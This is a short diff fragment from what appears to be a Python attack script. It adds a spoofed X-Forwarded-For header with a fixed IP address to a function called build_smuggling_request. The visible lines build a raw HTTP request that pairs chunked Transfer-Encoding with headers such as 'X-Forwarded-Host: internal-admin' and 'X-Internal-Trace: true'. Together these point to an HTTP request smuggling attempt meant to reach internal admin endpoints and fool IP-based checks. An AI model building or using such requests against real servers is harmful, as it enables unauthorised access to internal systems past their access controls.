@@ -89,6 +89,7 @@ def build_smuggling_request():
         f"Transfer-Encoding: chunked\r\n"
         f"Content-Type: application/json\r\n"
         f"X-Request-ID: {CORRELATION_ID}\r\n"
+        f"X-Forwarded-For: 45.33.32.156\r\n"
         f"X-Internal-Trace: true\r\n"
         f"X-Forwarded-Host: internal-admin\r\n"
         f"User-Agent: Mozilla/5.0\r\n"
